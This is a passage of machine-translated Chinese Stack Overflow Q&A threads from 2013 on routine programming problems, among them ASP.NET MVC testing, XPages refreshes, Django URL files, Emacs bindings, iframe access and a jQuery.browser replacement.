@ViewData["tempvalue"].ToString() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:54:07.030

在 MVC 中，控制器代码应返回包含模型的“ActionResult”对象。

如果您要传递给视图的数据只是一个字符串，请使用：

```
public ActionResult Convert()
{
    //...
    return View("your result here...");
} 
```

您可以使用视图或测试中的“模型”属性来引用控制器返回的数据。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-01-17T13:30:27.830

让我们在这里倒退一分钟。

控制器

```
public class ConvertController : Controller
{
    public ActionResult Convert(MyConvertViewModel vm)
    {
        if (vm == null) { return View("convert", new MyConvertViewModel { ShowResult = false }); }

        if (vm.Option == 1)
        {
            vm.Result = FahrenheitToCelsius(vm.Input);
            vm.OptionName = "Fahrenheit To Celsius";
        }
        else
        {
            vm.Result = CelsiusToFahrenheit(vm.Input);
            vm.OptionName = "Celsius to Fahrenheit";
        }
        vm.ShowResult = true;

        //not needed, just for an example
        ViewData.Add("glosrob-example", "A value goes here!");

        return View("convert", vm);
    }

    private static double CelsiusToFahrenheit(double temperatureCelsius)
    {
        double celsius = temperatureCelsius;
        return (celsius * 9 / 5) + 32;
    }

    private static double FahrenheitToCelsius(double temperatureFahrenheit)
    {
        double fahrenheit = temperatureFahrenheit;
        return (fahrenheit - 32)*5/9;
    }
}

public class MyConvertViewModel
{
    public double Result { get; set; }
    public int Option { get; set; }
    public double Input { get; set; }
    public string OptionName { get; set; }
    public bool ShowResult { get; set; }
} 
```

看法

```
@model MvcApplication1.Controllers.MyConvertViewModel
@{
    ViewBag.Title = "Convert";
}
<h2>Convert</h2>

@using (Html.BeginForm("convert", "convert", FormMethod.Post))
{
 <div>
     Let's convert some temperatures!
 </div>
 <div>
     @Html.LabelFor(x => x.Input, "Temp. To Convert")
     @Html.TextBoxFor(x => x.Input)
 </div>
 <div>
     @Html.LabelFor(x => x.Option, "Convert to ")
     @Html.DropDownListFor(x => x.Option, new List<SelectListItem>
     {
         new SelectListItem {Text = "Celsius", Value = "1"},
         new SelectListItem {Text = "Fahrenheit", Value = "2"}
     })
 </div>
 <div>
     <button type="submit">Convert It!</button>
 </div>
}
@if (Model.ShowResult)
{
    <p>@Model.OptionName : @Model.Input = @Model.Result</p>
} 
```

免责声明：那里有很多快捷方式，它只是为了让您了解您应该拥有什么。

所以视图会将用户选择的数据发回给控制器动作`Convert`

控制器会依次返回一个 ViewResult 对象，并使用视图模型中捕获的数据进行渲染`MyConvertViewModel`

现在我们要对此进行测试。

所以这里有一些更重要的属性，你似乎需要加入这些属性

```
[TestMethod]
public void Not_A_Real_Test_But_Stuff_You_Will_Want_To_Use()
{
    //arrange
    var c = new ConvertController();

    //act
    var results = c.Convert(null) as ViewResult;

    //now results is a ViewResult or null

    var theViewModelProperty = results.Model as MyConvertViewModel;
    var exampleResult = theViewModelProperty.Result;
    var exampleInput = theViewModelProperty.Input;

    //etc

    //how about the view that was returned?
    var theViewName = results.ViewName;

    //or anything you put in the ViewData
    var theViewData = results.ViewData["glosrob-example"];

    Assert.Fail("This was not a real test!");
} 
```

希望这能让您了解如何测试控制器方法的输出。

编辑：我不是为你写所有的测试，而是作为一个例子

```
[TestMethod]
public void Convert_Should_Return_A_MyConvertViewModel()
{
    //arrange
    var c = new Controller();

    //act
    var result = c.Convert(null) as ViewResult;

    //assert
    Assert.IsNotNull(result);
    Assert.IsInstanceOfType(result.ViewModel, typeof(MyConvertViewModel));
}

[TestMethod]
public void Convert_Should_Return_The_Correct_View()
{
    //arrange
    var c = new Controller();

    //act
    var result = c.Convert(null) as ViewResult;

    //assert
    Assert.IsNotNull(result);
    Assert.AreEqual("convert", result.ViewName);
} 
```

# xpages - XPages：在客户端功能之后执行 context.redirectToPage？

> ID：14379519
> 
> 赞同：0
> 
> 时间：2013-01-17T12:49:31.667
> 
> 标签：xpages, xpages-ssjs

为什么 context.redirectToPage 在视图根事件而不是事件处理程序中执行时表现不同？

当我尝试将 xpages 应用程序的语言设置为保存在用户配置文件中的语言时，出现了这个问题，一旦用户登录。我在资源包中使用带有翻译字符串的属性文件，并检索字符串，如这：

```
<xp:text value="${langString['WELCOME_TEXT']}" /> 
```

当更改语言并加载不同的属性文件时，需要刷新页面以更新这些字符串。当我向登录按钮添加一个完全刷新事件处理程序时，这很好用，它执行服务器端 context.redirectToPage()。像 location.reload 或 window.location.href=window.location.href 这样的客户端刷新没有运气（登录功能本身就是客户端功能）。

但是，用户当然希望在他输入凭据后按下回车键而不是按钮时他也已登录。所以我在用户名和密码输入字段中添加了一个onkeypress-event，并在执行登录功能之前检查了输入键（if (thisEvent.keyCode==13) dosomething...）。

但是现在每次按下一个键时都会调用事件处理程序，当然我不希望 context.redirectToPage 一直执行。因此，我删除了服务器端事件处理程序并更改了登录功能，以便它以包含整个页面的 div 的部分刷新而终止：

```
var p = {"execLogin":"true"}; XSP.partialRefreshPost( '#{id:wholePage}', {params: p} ); 
```

通过部分刷新发送的参数现在会触发一个事件，我们的 context.redirectToPage 会在该事件中执行：

```
<xp:this.beforeRenderResponse><![CDATA[#{javascript:if (param.containsKey('execLogin') && param.get('execLogin').toString().equals('true')) {
    print("test");
    context.redirectToPage(context.getUrl().toSiteRelativeString(context),true);
}}]]></xp:this.beforeRenderResponse> 
```

页面刷新并打印出“测试”，但我仍然看到旧的语言字符串。我必须再次手动刷新页面才能使新的用户语言生效。

知道如何以这种方式执行真正的完全刷新，或者以另一种方式更新从属性包中检索到的字符串吗？

提前致谢。问候，莎拉

**编辑**

我现在有：

```
<xp:inputText id="cc_login_panel_login_username" styleClass="span2">
<xp:eventHandler event="onkeypress" submit="true" refreshMode="complete">
    <xp:this.script><![CDATA[if (thisEvent.keyCode!=13) {
        return false;
    } else {
        doLogin();
        return true;                                
    }]]></xp:this.script>
    <xp:this.action><![CDATA[#{javascript:context.redirectToPage(context.getUrl().toSiteRelativeString(context));}]]></xp:this.action>
</xp:eventHandler> 
```

因为 context.reloadPage() 甚至没有让我以某种方式登录（奇怪），所以我重新使用了 redirectToPage。服务器端事件在正确的时间触发一次*竖起大拇指*，但语言属性-行为仍然相同。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T20:17:38.960

$ 仅在页面加载时设置，而 # 在每次部分刷新期间设置。

我不认为部分刷新会起作用。这将刷新计算域。但是，需要完全刷新才能刷新包含属性文件的 XPage 部分。换句话说，您将刷新计算域，但使用相同的属性文件。

我想知道 context.redirectToPage 或 context.reloadPage 是否会以某种方式进入同一页面但带有缓存的属性文件。

如果您总是想返回同一页面，则完全刷新而不是部分刷新可能是最佳选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:37:42.407

我认为这与使用 $ 参数有关。这告诉运行时在第一次在后端创建当前页面时检索语言文件。当用户进行刷新时，它实际上是在检索您正在查看的页面的已保存版本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-18T14:14:49.890

我看到您在 xp:eventHandler 的 xp:this.action 标记中调用“context.redirectToPage(context.getURL().toSiteRelativeString(context)))”。

尝试使用 xp:this.onComplete 代替 xp:this.action。

根据该操作的设计器工具提示，预期返回是要传递给导航处理程序的字符串。因此，当它完成 eventHandler 事件组时，给 onComplete 将执行重定向命令。

![事件处理程序操作工具提示](../Images/2e98f3c0242c8e2449781ebc01469433.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-19T12:09:01.813

感谢所有有用的答案，事实上它们都起作用了，问题原来是我对属性文件*何时*加载的误解。它是在早期阶段加载的，早在我的新语言设置为 sessionScope 之前（该 sessionScope 变量随后通过 VariableResolver 用作要加载的属性文件名称的一部分）。

现在我使用双完全刷新来加载新文件。当登录函数成功终止时，它执行：

```
window.location.href = window.location.href + "?doRefresh=true"; 
```

在视图根元素中，我添加了以下事件：

```
<xp:this.beforeRenderResponse><![CDATA[#{javascript:
if (context.getUrlParameter("doRefresh")!=null&&context.getUrlParameter("doRefresh").equals("true")) {
    var url = context.getUrl().toSiteRelativeString(context);
    url = url.replace("?doRefresh=true","");
    context.redirectToPage(url);}
}]]></xp:this.beforeRenderResponse> 
```

这不是一个非常复杂的解决方案，但至少它有效:-)

# asp.net-mvc - 我可以在不使用视图模型的情况下从操作访问视图元素吗？

> ID：14379520
> 
> 赞同：0
> 
> 时间：2013-01-17T12:49:32.167
> 
> 标签：asp.net-mvc, asp.net-mvc-4

我有一个类似这样的删除操作 - 针对这个问题进行了删节：

```
[HttpGet]
public ActionResult Delete(int id)
{
    var skill = _applicantSkillService.ReadApplicantSkill(id);
    try
    {
        _applicantSkillService.DeleteApplicantSkill(skill);
    }
    catch (Exception ex)
    {

        return View(model);
    }
} 
```

现在我主要关心的是在视图中设置错误消息而不再次构建整个视图模型。有什么办法可以做到这一点吗？

我刚刚注意到的第二个问题是此操作方法需要视图返回，而视图需要非空模型。我在这里有什么“逃生路线”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:05:05.573

您可以将错误消息放在 ViewData 或 TempData 对象中，然后将其打印在视图上，例如

```
@ViewData["err"].ToString() 
```

或者，您可以在模型上创建错误消息的属性并在返回视图之前分配它

```
model.Errormsg="your message"; 
```

# android - 实现 Android Pdf Viewer 库

> ID：14379522
> 
> 赞同：6
> 
> 时间：2013-01-17T12:49:39.423
> 
> 标签：android, pdf-viewer

它似乎是唯一不依赖于 MuPDF 的免费 android pdf 阅读器。

我试图证明这一点，我已经[下载了该项目](https://github.com/jblough/Android-Pdf-Viewer-Library)，但要运行它，我得到了异常：

```
01-17 13:45:03.960: E/AndroidRuntime(13631): FATAL EXCEPTION: main
01-17 13:45:03.960: E/AndroidRuntime(13631): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{net.sf.andpdf.pdfviewer/net.sf.andpdf.pdfviewer.PdfViewerActivity}: java.lang.InstantiationException: can't instantiate class net.sf.andpdf.pdfviewer.PdfViewerActivity
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1894)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1995)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.app.ActivityThread.access$600(ActivityThread.java:128)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1161)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.os.Handler.dispatchMessage(Handler.java:99)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.os.Looper.loop(Looper.java:137)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.app.ActivityThread.main(ActivityThread.java:4514)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at java.lang.reflect.Method.invokeNative(Native Method)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at java.lang.reflect.Method.invoke(Method.java:511)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:790)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:557)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at dalvik.system.NativeStart.main(Native Method)
01-17 13:45:03.960: E/AndroidRuntime(13631): Caused by: java.lang.InstantiationException: can't instantiate class net.sf.andpdf.pdfviewer.PdfViewerActivity
01-17 13:45:03.960: E/AndroidRuntime(13631):    at java.lang.Class.newInstanceImpl(Native Method)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at java.lang.Class.newInstance(Class.java:1319)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.app.Instrumentation.newActivity(Instrumentation.java:1027)
01-17 13:45:03.960: E/AndroidRuntime(13631):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1885) 
```

在项目的自述文件中，最后一步我看不懂。

6) 使用以下代码调用派生的 PdfViewActivity：

```
 Intent intent = new Intent(this, YourPdfViewerActivity.class);
 intent.putExtra(PdfViewerActivity.EXTRA_PDFFILENAME, "PATH TO PDF GOES HERE");
 startActivity(intent); 
```

谁能解释一下这一步是什么？或者更重要的是：有人能够使用这个 pdf 阅读器吗？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-28T13:04:20.723

问题是`PdfViewerActivity`您尝试在您`Intent`的实例中实例化`abstract class`并且无法实例化（[此处](https://github.com/jblough/Android-Pdf-Viewer-Library/blob/master/src/net/sf/andpdf/pdfviewer/PdfViewerActivity.java)的类链接）。您需要创建一个 Activity 来扩展`PdfViewerActivity`实现该类具有的任何抽象方法。像这样的东西：

```
public class MyPdfViewerActivity extends PdfViewerActivity {

   //Your implementation code here.
} 
```

# sql-server - 项目仪表板中的“报告服务错误”

> ID：14379527
> 
> 赞同：1
> 
> 时间：2013-01-17T12:49:44.220
> 
> 标签：sql-server, sharepoint, tfs

我正在使用 TFS 2012、SQL2012 和 Sharepoint 2010。我完成了 TFS 的高级安装，并相信我错过了一些权限或应用程序池的一些东西。与 TFS 相关的所有内容都运行良好，但每当我进入 Task Burndown 下的项目仪表板时，我都会看到此错误：

Reporting Services 错误 报告处理过程中发生错误。(rsProcessingAborted) 获取联机帮助 数据集“dsProjectGuid”的查询执行失败。(rsErrorExecutingCommand) 获取联机帮助 有关此错误的详细信息，请导航到本地服务器计算机上的报表服务器，或启用远程错误 SQL Server Reporting Services

然后在燃烧率下我看到这个错误：报告处理期间发生错误。(rsProcessingAborted) 获取联机帮助 数据集“dsProjectGuid”的查询执行失败。(rsErrorExecutingCommand) 获取联机帮助 有关此错误的详细信息，请导航到本地服务器计算机上的报表服务器，或启用远程错误 SQL Server Reporting Services

我遇到了[这篇](http://davidrbrown.com/2010/04/06/tfs-2010-reporting-services-error-rsinvalidreportparameter/)看起来很相似的帖子，但后来我尝试实际处理数据库时出现错误。

此外，如果我转到 TFS 管理控制台 >> 应用程序层 >> 报告，我会看到仓库数据库和分析数据库是“已配置且已启用作业”。

我错过了什么？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T05:19:14.233

首先你没有提到：

*   操作系统（Windows Server 2012 或 2008 或 2008 R2 以及哪个 SP ？？？）
*   SharePoint Foundation 或 SharePoint Server 2010，是否是带有 SP1 的 SharePoint？
*   你手动尝试处理仓库时遇到的错误？？？

无论如何，报告错误可能是由于多种原因而发生的，所以我给你的建议是，看看我关于安装 TFS 2012 和 2010 的 2 **Guides**，看看报告部分，你就会知道你应该做什么以及如何验证在进行下一步之前的每一步，他们都有视频和文档，其中包含所需的每个详细步骤。

我建议查看整个部分，因为有时错误会出现在用于配置**报告服务**的服务帐户中，该服务帐户将在第一部分退出。

[TFS 2012 指南](http://tfs2012visualguide.codeplex.com/)

[TFS 2010 指南](http://tfs10enterprise.codeplex.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-20T10:35:18.667

[http://www.experts-exchange.com/Programming/Languages/.NET/Q_26427476.html](http://www.experts-exchange.com/Programming/Languages/.NET/Q_26427476.html)

我提到了上面对我有用的链接。

我将数据源 TfsReportDS 的初始目录设置为“Tfs_Warehouse”，将数据源 TfsOlapReportDS 的初始目录设置为 Tfs_Analysis。其他设置我将其保留为默认设置，即 TfsReportDS 的“Windows 集成安全性”和“Tfs2010OlapReportDS 不需要凭据”

雅各布

# django - 我可以有两个不同名称的 urls.py 吗？

> ID：14379531
> 
> 赞同：2
> 
> 时间：2013-01-17T12:49:52.180
> 
> 标签：django, django-urls, django-cms

在 Django 中，是否可以有两个具有 url 模式的不同文件，而这两个文件都不被调用`urls.py`？或者 Django 是否依赖于每个 Django 应用程序只有一组 url 模式，并且必须调用它`urls.py`？

我正在使用 Django CMS，我想将一个应用程序拆分为两个 apphook 和两个菜单。因此，我尝试拆分`urls.py`为`pub_urls.py`，但尽管命名了正确的 url ，`train_urls.py`但我似乎已经破坏了一些事情- 例如：`cms_app.py`

```
from cms.app_base import CMSApp
from cms.apphook_pool import apphook_pool
from django.utils.translation import ugettext_lazy as _
from resources.menu import TrainingMenu, PublicationMenu

class PublicationApp(CMSApp):
    name = _("Publication App") # give your app a name, this is required
    urls = ["resources.pub_urls"] # link your app to url configuration(s)
    menus = [PublicationMenu]

class TrainingApp(CMSApp):
    name = _("Training App") # give your app a name, this is required
    urls = ["resources.train_urls"] # link your app to url configuration(s)
    menus = [TrainingMenu]

apphook_pool.register(PublicationApp) # register your app
apphook_pool.register(TrainingApp) # register your app 
```

这样的事情可能吗？还是我必须将其拆分为两个不同的应用程序？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T13:09:07.430

没有什么可以阻止您`urls.py`简单地充当包含多个其他 urls 文件的方式：

`urls.py`：

```
from django.conf.urls.defaults import patterns, include   
urlpatterns = urlpatterns + patterns('',
                                         (r'^', include('pub_urls')),
                                         (r'^', include('train_urls'))) 
```

`pub_urls.py`：

```
from django.conf.urls.defaults import patterns, url

urlpatterns = patterns('',
    (r'^$', 'homeview'),
    (r'^stuff/$', 'stuffview')
) 
```

等等

`ROOT_URLCONF`在您的设置文件中指向根 url 文件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-17T13:06:11.727

Django 不在乎你的 urlpatterns 文件叫什么。默认的基本 urlconf 按照惯例称为 urls.py，但实际上这[只是一个设置](https://docs.djangoproject.com/en/1.4/ref/settings/#root-urlconf)，可以被覆盖。之后，您需要按模块名称显式包含 urlconfs，因此它们的名称也没有区别。

我不熟悉 Django-CMS，也不知道它在它的 CMSApp 类中做了什么，但我怀疑你必须深入研究它才能看到发生了什么。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-17T13:08:37.830

它可以使用`ROOT_URLCONF`设置进行配置。

[来自 django 文档](https://docs.djangoproject.com/en/dev/ref/settings/#std%3asetting-ROOT_URLCONF)

```
ROOT_URLCONF 
  A string representing the full Python import path to your root URLconf. 
  For example: "mydjangoapps.urls". Can be overridden on a per-request basis 
  by setting the attribute urlconf on the incoming HttpRequest object. See How 
  Django processes a request for details. 
```

您还可以编写/获取一个中间件，该中间件可以根据请求中的主机或其他参数进行适当的设置。

# api - API 中的许多请求与许多单独的请求

> ID：14379532
> 
> 赞同：0
> 
> 时间：2013-01-17T12:49:53.323
> 
> 标签：api, google-maps

我正在制作一个基于谷歌地图 API 的应用程序。这需要请求两个城市之间的距离。现在我想要许多城市之间的距离。

所以我应该使用“for loop”并分别提出许多请求，还是应该在一个链接中发送所有城市名称。哪一个会工作得更快？哪一个会更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:58:48.333

当然，您应该避免发送多个请求，因为每次往返服务器都需要时间。

但是，当您对许多请求进行分组时，这也可能需要很长时间（发送和在服务器上处理），并影响用户体验（等待时间长）。

在您的情况下，我怀疑“for循环”不会加载大量数据，并且服务器端处理也不会太重，因此发送分组的单个请求应该是要走的路。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-18T12:00:59.403

您可以使用 Google 提供的“DirectionService”服务，即“api3”。可以查询多个城市之间的距离，一个请求需要1个起点、终点和8个路点（共10个地方），并提供一个JSON文件作为返回，其中包含所有信息（距离KM，值米，城市名称等等）。请查看此链接， [https://developers.google.com/maps/documentation/javascript/directions](https://developers.google.com/maps/documentation/javascript/directions)。我希望这个答案能满足你的要求，否则不要介意。

# emacs - 如何解除 [left-fringe mouse-1] 键的绑定？

> ID：14379535
> 
> 赞同：1
> 
> 时间：2013-01-17T12:50:00.110
> 
> 标签：emacs

我正在使用 GNU Emacs 24.2。单击左边缘将当前行设置在单击行上。我不想改变当前行，所以我需要解绑这个键。我在我的 .emacs 文件中添加了这个>

```
 (global-unset-key [left-fringe mouse-1]) 
```

但这不起作用。运行“Ch b”（描述绑定）它仍然显示：

[left-fringe mouse-1] mouse--strip-first-event

我怎样才能解开这个键？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T17:00:35.900

[left-fringe mouse-1] 到`mouse--strip-first-event`的绑定不在将键绑定到命令的映射中，因为`mouse--strip-first-event`它不是命令（相反，它是一个重新映射函数，将键序列重写为其他内容，在这种情况下它只是剥离第一个事件，以便您最终运行绑定到 [mouse-1] 的任何内容）。

这个绑定在`function-key-map`，所以你可以用

```
(define-key function-key-map [left-fringe mouse-1] nil) 
```

但还要注意，`function-key-map`仅当没有绑定到当前事件序列时才应用定义的重新映射，因此您实际上不需要删除它：只需添加一个绑定 (via `global-set-key`) for`[left-fringe mouse-1]`并且上面的重新映射将被忽略。

# javascript - 如何在 BootStrap 中的第一个输入字段上设置焦点？

> ID：14379536
> 
> 赞同：7
> 
> 时间：2013-01-17T12:50:02.140
> 
> 标签：javascript, html, twitter-bootstrap

> **可能重复：**
> [如何将焦点设置到独立于 id 的 HTML 表单中的第一个输入元素？](https://stackoverflow.com/questions/277544/how-to-set-the-focus-to-the-first-input-element-in-an-html-form-independent-from)

我正在使用带有 ASP.NET MVC4 的 BootStrap。有一个登录表单，但我无法将焦点设置在第一个输入字段上。

如何将焦点设置在输入的第一个字段上？是否有任何用于设置焦点的 BootStrap 类？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-01-17T16:40:42.147

没有特定于 Bootstrap 的类或函数可以执行此操作*，但 HTML5 提供[了输入字段的`autofocus`属性](https://developer.mozilla.org/en-US/docs/HTML/Forms_in_HTML#The_autofocus_attribute)。

[此属性目前享有广泛的浏览器支持](http://caniuse.com/#feat=autofocus)。

*-由于您使用的是 Bootsrap，并且 Bootstrap 由 jQuery 提供支持，因此您可以“填充”不支持自动对焦的旧浏览器：

```
$('[autofocus]:first').focus(); 
```

# javascript - Javascript更改iFrame中的文本框值

> ID：14379537
> 
> 赞同：1
> 
> 时间：2013-01-17T12:50:09.427
> 
> 标签：javascript, iframe

我正在尝试更改 iframe 中文本框的值。我已经尝试过以各种我能找到的方式使用 GetElementById，但似乎没有任何效果。

我通过使用 Object 数据标签找到了 iframe 的替代方案，但它也有同样的问题。

我的代码或多或少，为了演示而对其进行了一些更改：

```
 <html>
 <head>

 <title>None</title>

 </head>
 <body>

 <script type="text/javascript">

 function changeValue() {
 var textBox = document.getElementById('userName');
 textBox = "hello!";

 }

 </script>

 <iframe id="myFrame" src="http://www.website.com"></iframe> 

 <input type="button" onclick="changeValue()" value="Submit">

 </body>
 </html> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:52:17.780

出于安全原因，这是不可能的。

如果您有访问权限，您将能够加载，比如`facebook.com`在您网站上的 iframe 中，并使用 JavaScript 提取用户详细信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:59:56.287

尝试一些类似的东西

```
document
    .getElementById('myFrame')
    .contentWindow
    .document
    .getElementById('userName')
    .value='hello'; 
```

正如其他人指出的那样，这仅在 iframe 内的页面位于同一域中时才有效。

# javascript - 什么是 jquery.browser（在 jquery 1.9 中删除）的快速、纯 javascript 替代品？

> ID：14379539
> 
> 赞同：5
> 
> 时间：2013-01-17T12:50:22.947
> 
> 标签：javascript, jquery, browser-detection

是的，我知道特征检测更可取。

我的代码库中有一个案例，我们正在使用`$.browser.msie`并`$.browser.version`决定是否渲染一些 CSS。写代码的开发者已经不在我们身边了，我也不完全明白应该在这里写什么样的特征检测。

作为快速修复，实现 $.browser.msie 和 $.browser.version 的最短方法是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-17T13:03:18.177

我只是从[jQuery 1.8.3](http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js)复制代码。

```
// Limit scope pollution from any deprecated API
(function() {

var matched, browser;

// Use of jQuery.browser is frowned upon.
// More details: http://api.jquery.com/jQuery.browser
// jQuery.uaMatch maintained for back-compat
jQuery.uaMatch = function( ua ) {
    ua = ua.toLowerCase();

    var match = /(chrome)[ \/]([\w.]+)/.exec( ua ) ||
        /(webkit)[ \/]([\w.]+)/.exec( ua ) ||
        /(opera)(?:.*version|)[ \/]([\w.]+)/.exec( ua ) ||
        /(msie) ([\w.]+)/.exec( ua ) ||
        ua.indexOf("compatible") < 0 && /(mozilla)(?:.*? rv:([\w.]+)|)/.exec( ua ) ||
        [];

    return {
        browser: match[ 1 ] || "",
        version: match[ 2 ] || "0"
    };
};

matched = jQuery.uaMatch( navigator.userAgent );
browser = {};

if ( matched.browser ) {
    browser[ matched.browser ] = true;
    browser.version = matched.version;
}

// Chrome is Webkit, but Webkit is also Safari.
if ( browser.chrome ) {
    browser.webkit = true;
} else if ( browser.webkit ) {
    browser.safari = true;
}

jQuery.browser = browser;
})(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-17T12:52:50.093

使用[条件注释](http://www.quirksmode.org/css/condcom.html)而不是 JavaScript。

```
<!--[if lte IE 7]>
<link rel="stylesheet" href="ie.css" type="text/css">
<![endif]--> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-17T12:57:54.677

一个快速修复，以便脚本在正确重构之前不会中断（如果需要，为其他版本添加条件注释）：

```
<!--[if IE 7]>
<script> if(typeof $!== typeof undefined){ $.browser = { msie : true, version : 7 }} </script>
<![endif]-->
<!--[if IE 8]>
<script> if(typeof $!== typeof undefined){ $.browser = { msie : true, version : 8 }} </script>
<![endif]--> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-17T16:09:16.777

JQuery 发布了一个[Migrate 插件](https://github.com/jquery/jquery-migrate/)，可以在与 1.9 一起使用时恢复 $.browser。请务必在生产服务器上使用 Migrate 的生产版本。开发版本将生成一堆控制台消息，告诉您在 1.9 无 Migrate 中您的代码会在哪里中断。

然而，使用 JQuery Migrate 来恢复 $.browser 可能不是最好的长期解决方案。顾名思义，它的目的是作为一个过渡工具，我不知道它的浏览器检测功能会被积极维护。另一种选择是[Modernizr](http://modernizr.com/)。

我个人要做的是将我的生产站点暂时保留在 JQ 1.8 上，并在我的开发机器上使用 Migrate 的开发版本进行测试，以更好地了解 1.9 会破坏什么（他们所做的远远超过在决定升级策略之前，只需删除 $.browser)。

# iphone - 乘除 CGFloat 和精度损失

> ID：14379541
> 
> 赞同：1
> 
> 时间：2013-01-17T12:50:25.900
> 
> 标签：iphone, ios, cocoa-touch, math

> **可能重复：**
> [CGFloat 添加错误？](https://stackoverflow.com/questions/7302384/cgfloat-addition-bug)

`CGFloats`我有一些代码，为了找出转换的正确尺寸，我做了很多乘法和除法。我注意到有时当我想得到 320 的值时，我会得到 320.00000092。谁能解释为什么会发生这种情况以及如何纠正它？是不是应该这样做？以下是一些可能发生问题的示例代码：

```
- (void) setMinimumSize
{
    CGSize superViewSize = self.superview.bounds.size;
    CGSize size = self.frame.size;

    CGFloat xScale = superViewSize.width / size.width;
    CGFloat yScale = superViewSize.height / size.height;

    CGFloat minimumScale = MIN(xScale, yScale);
    self.minimumSize = CGSizeMake(size.width * minimumScale, size.height * minimumScale);
}

- (void) scaleToMinimumSize
{
    self.transform = CGAffineTransformScale(self.transform, self.minimumSize.width / self.frame.size.width, self.minimumSize.height / self.frame.size.height);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:58:05.233

不要比较相等，不适用于浮点（或双精度），而是将差异与适合您准确性需求的某个增量进行比较

这始终是十进制和浮点数的问题。

问一个中学生（1/3.0）*3.0，都说1。电脑说0.999999。

大多数时候，你不能指望 `0`它`0.000000`永远不会接近那个。

编辑：

如果浮动非常有用，您应该阅读此 [http://en.wikipedia.org/wiki/IEEE_754-2008](http://en.wikipedia.org/wiki/IEEE_754-2008)

还有[每个计算机科学家都应该知道的关于浮点运算的知识](http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html)，

# jquery - 在 jquery 插件中调用多个函数

> ID：14379544
> 
> 赞同：0
> 
> 时间：2013-01-17T12:50:36.273
> 
> 标签：jquery, function, plugins

我喜欢在插件中调用多个函数，但由于某些原因，我得到了*方法 undefined*。

如果我不使用方法来包装我得到的函数

*函数语句需要一个名称*

1.  我在这里做错了什么？
2.  我需要用方法var包装函数吗？

    ```
    (function ($) {

    var methods = {

        // GET TARGET LOCATION AND ANIMATE
        scrollTopPage: function () {

            $(htmlBody).animate({
                scrollTop: 0
            }, 'slow');

        },

        scrollToSect: function (htmlBody) {

            $(htmlBody).animate({

                scrollTop: $('#page-id').offset().top
            });

        },

        goToID: function (sectID) {

            var htmlBody = 'html,body';

            //Scroll to the very top
            if (sectID == 'home') {

                methods.scrollTopPage(htmlBody);

            } else {

                methods.scrollToSect(htmlBody);

            }

        }

    } // End the Methods/Functions

    $.fn.pageScroller = function (methods) {

        this.click(function (e) {

            sectID = $(this).attr('id');

                e.preventDefault();

                // Undefined Error
                methods.goToID(sectID); // Call the goToID function and pass the sectID variable

                    $(this).parent().addClass('current').prev().removeClass('current');
                    $(this).parent().addClass('current').next().removeClass('current');

        });

        $(document).keydown(function (e) {

            //To Do Re Use the methods/functions here

        });

    };

    })(jQuery); 
    ```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:00:54.617

您正在分配一个变量，而不是在以下位置调用函数：

```
 $.fn.pageScroller = function (methods) { .... 
```

我猜这会导致当函数实际从`$.fn.pageScrollerplugin`或任何调用函数时，参数将被命名`methods`，但不会是您创建的方法对象。相反，它将是调用者选择作为参数传递的任何内容。在您的情况下，似乎根本没有传递任何参数。`methods`这就是为什么`undefined`。

如果你不为这个函数设置参数，是不是会导致`methods`引用你的函数集合而不是传递的参数？

即：试试这个，希望`methods`仍然可以访问：

```
 $.fn.pageScroller = function () { .... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:25:52.747

另一种方法是`methods`在插件内部拥有这样的属性......

```
(function ($) {

$.fn.pageScroller = function () {

  this.methods = {

